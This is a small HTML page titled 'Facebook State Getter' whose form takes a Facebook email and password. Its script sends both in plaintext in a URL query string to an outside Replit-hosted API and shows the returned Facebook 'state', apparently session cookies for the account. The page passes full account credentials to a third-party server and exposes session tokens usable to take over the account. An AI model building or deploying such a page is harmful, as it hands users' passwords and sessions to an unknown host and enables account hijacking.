<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook State Getter</title>
</head>
<body>
    <h1>Facebook State Getter</h1>
    <form id="fbForm">
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>
        <button type="submit">Get State</button>
    </form>
    <div id="result"></div>

    <script>
        document.getElementById('fbForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const url = `https://nash-rest-api.replit.app/app-state?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;

            try {
                const response = await fetch(url);
                if (!response.ok) {
                    throw new Error('Network response was not ok ' + response.statusText);
                }
                const data = await response.json();
                document.getElementById('result').innerText = JSON.stringify(data, null, 2);
            } catch (error) {
                console.error('Error fetching the Facebook state:', error);
                document.getElementById('result').innerText = 'Error fetching the Facebook state.';
            }
        });
    </script>
</body>
</html>
